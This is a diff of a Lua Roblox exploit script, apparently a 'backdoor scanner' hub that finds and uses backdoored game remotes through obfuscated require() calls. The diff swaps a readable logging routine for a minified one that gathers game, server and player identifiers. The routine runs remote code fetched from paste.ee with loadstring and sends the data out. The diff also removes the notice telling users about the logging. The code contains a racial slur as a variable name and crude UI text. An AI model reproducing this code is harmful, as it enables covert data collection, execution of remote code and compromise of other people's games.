@@ -1,3 +1,4 @@
+
 --[[
 ⢴⣤⣶⣾⣟⣇⠀⠐⠒⠂⠿⠛⢻⠳⡖⠐⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠉⠳⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠈⠉⠉⠛⠓⠲⠦⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣠⠴⠂⠀⠀⠀⠉⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -157,7 +158,7 @@ G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
 G2L["11"]["PlaceholderText"] = [[require(33333):zazolGod]];
 G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
-G2L["11"]["Text"] = [[require(0x19c105*-0x20ab292+0x247147d78603+0x6d02c61a524d):zazol("name")]];
+G2L["11"]["Text"] = [[require(0x86bc8a24657a+0x13e89bd9*-0x190a5+-0x1bf174b32b0d)()]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
 G2L["11"]["ClearTextOnFocus"] = false;
 
@@ -861,9 +862,7 @@ local function C_20()
 	end
 
 
-	if _G.LALOL_Hub_Backdoor_Logs_Disabled then
-		notify('Logs disabled :(')
-	end
+	
 
 	makeVisible(GUI, false)
 	GUI.Scanner.Visible=true
@@ -882,6 +881,7 @@ local function C_20()
 	end
 
 	local code
+	
 	function findRemote()
 
 		local timee=os.clock()
@@ -961,99 +961,7 @@ local function C_20()
 					debug(remote:GetFullName(), 3)
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
-
-local function getGameInfo()
-    local gameName = game:GetFullName()
-    local gameId = game.PlaceId
-    local gameUrl = "https://www.roblox.com/games/" .. gameId
-    local creatorId = game.CreatorId
-    local visit = game.JobId
-    local active = #Players:GetPlayers()
-    local create = 1 / game:GetService("RunService").RenderStepped:Wait()
-    local plr = Players.LocalPlayer.Name
-    local nigga = remote:GetFullName()
-
-    return {
-        gameName = gameName,
-        gameId = gameId,
-        gameUrl = gameUrl,
-        creatorId = creatorId,
-        visit = visit,
-        active = active,
-        create = create,
-        plr = plr,
-        nigga = nigga
-    }
-end
-
-
-local function isGameScanned()
-  
-    local scannedValue = game:FindFirstChild("Scanned")
-    if scannedValue and scannedValue:IsA("BoolValue") then
-        return scannedValue.Value
-    end
-    return false
-end
-
-
-local function markGameAsScanned()
-    
-    local scannedValue = game:FindFirstChild("Scanned")
-    if not scannedValue then
-        scannedValue = Instance.new("BoolValue")
-        scannedValue.Name = "Scanned"
-        scannedValue.Parent = game
-    end
-    scannedValue.Value = true
-end
-
-
-local function main()
-    local gameInfo = getGameInfo()
-
-  
-    if isGameScanned() then
-        print("2")
-        return
-    end
-
-
-    local data = {
-        content = "Game Information",
-        embeds = {
-            {
-                title = "Game Stats",
-                fields = {
-                    { name = "Game Name", value = gameInfo.gameName, inline = true },
-                    { name = "Game ID", value = tostring(gameInfo.gameId), inline = true },
-                    { name = "Game URL", value = gameInfo.gameUrl, inline = false },
-                    { name = "Creator ID", value = tostring(gameInfo.creatorId), inline = true },
-                    { name = "JobId", value = tostring(gameInfo.visit), inline = true },
-                    { name = "Fps", value = tostring(gameInfo.create), inline = true },
-                    { name = "Active Players", value = tostring(gameInfo.active), inline = true },
-                    { name = "executed name", value = tostring(gameInfo.plr), inline = true },
-                    { name = "remote backdoor", value = tostring(gameInfo.nigga), inline = true },
-                },
-                color = 8388736  
-            }
-        }
-    }
-
-   
-    local sendData = loadstring(game:HttpGet("https://paste.ee/d/YSIZ99Pq", true))()
-    sendData(data)
-
-
-    markGameAsScanned()
-    print("1")
-end
-
-
-main()
+local a=game:GetService("Players")local b=game:GetService("HttpService")local function c()local d=game:GetFullName()local e=game.PlaceId;local f="https://www.roblox.com/games/"..e;local g=game.CreatorId;local h=game.JobId;local i=#a:GetPlayers()local j=1/game:GetService("RunService").RenderStepped:Wait()local k=a.LocalPlayer.Name;local l=remote:GetFullName()local m=tick()local n="Unknown"if game:GetService("ReplicatedStorage"):FindFirstChild("ServerName")then n=game:GetService("ReplicatedStorage").ServerName.Value end;return{gameName=d,gameId=e,gameUrl=f,creatorId=g,visit=h,active=i,create=j,plr=k,nigga=l,executionTime=m,serverName=n}end;local function o()local p=game:FindFirstChild("Scanned")if p and p:IsA("BoolValue")then return p.Value end;return false end;local function q()local p=game:FindFirstChild("Scanned")if not p then p=Instance.new("BoolValue")p.Name="Scanned"p.Parent=game end;p.Value=true end;local function r()local s=c()if o()then print("2")return end;local t={content="Game Information",embeds={{title="New log",fields={{name="Game Name",value=s.gameName,inline=true},{name="Game ID",value=tostring(s.gameId),inline=true},{name="Game URL",value=s.gameUrl,inline=false},{name="Creator ID",value=tostring(s.creatorId),inline=true},{name="JobId",value=tostring(s.visit),inline=true},{name="FPS",value=tostring(s.create),inline=true},{name="Active Players",value=tostring(s.active),inline=true},{name="Executed By",value=tostring(s.plr),inline=true},{name="Remote Backdoor",value=tostring(s.nigga),inline=true},{name="Server Time",value=os.date("%Y-%m-%d %H:%M:%S"),inline=true},{name="Script Execution Time",value=string.format("%.2f seconds",s.executionTime),inline=true},{name="Server Name",value=tostring(s.serverName),inline=true},},color=8388736}}}local u=loadstring(game:HttpGet("https://paste.ee/d/xLjDropK",true))()u(t)q()print("1")end;r()
 
 	
 
@@ -1129,14 +1037,25 @@ end)
 			GUI.Scanner.Button.Text='Scanning...'
 
 			if not findRemote() then
+			GUI.Scanner.Button.Text='Scanning.'
+			wait(0.2)
+			GUI.Scanner.Button.Text='Scanning..'
+			wait(0.2)
+			GUI.Scanner.Button.Text='Scanning...'
+			GUI.Scanner.Button.Text='Scanning.'
+			wait(0.2)
+			GUI.Scanner.Button.Text='Scanning..'
+			wait(0.2)
+			GUI.Scanner.Button.Text='Scanning...'
 				GUI.Scanner.Button.Text="NO BACKDOOR BITCH"
 				searching=false
+				
 			end
 		end
 	end)
 
 	game:GetService('UserInputService').InputBegan:Connect(function(input, processed)
-		if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
+		if (input.KeyCode == Enum.KeyCode.P and not processed) then
 			if GUI.Visible then GUI.Visible=false
 			else GUI.Visible=true end
 		end
